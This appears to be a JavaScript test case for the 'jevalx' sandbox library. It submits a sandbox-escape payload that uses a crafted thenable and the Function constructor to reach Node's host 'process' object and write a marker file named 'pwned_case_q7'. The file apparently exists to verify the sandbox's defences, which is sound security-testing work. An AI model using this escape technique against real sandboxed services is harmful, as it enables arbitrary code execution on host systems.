let jevalxModule = require('./jevalx.js');
let assertWtf = require('assert');

//let jevalx = jevalxModule.jevalx_core;
let jevalx = jevalxModule.jevalx;

module.exports = {
q7:async()=>{
     var code=`
       (async()=>{
        let u = false;
        function t(o, e) {
        import('').then(_=>_, _=>_).then.constructor('return process')()?.mainModule.require("fs").writeFileSync("pwned_case_q7","");
        u = true;
        o(this);
        }
        const obj = {__proto__: { get then(){ if (u) { u = false; return undefined; } return t; } }};
        return obj
        })
     `
       try{
         console.log('Q7 result=',await jevalx(code));
       }catch(ex){
         console.log('Q7 ex=',ex.message);
       }
     console.log('Q7 check=',typeof(process),typeof(Promise));
   },
}
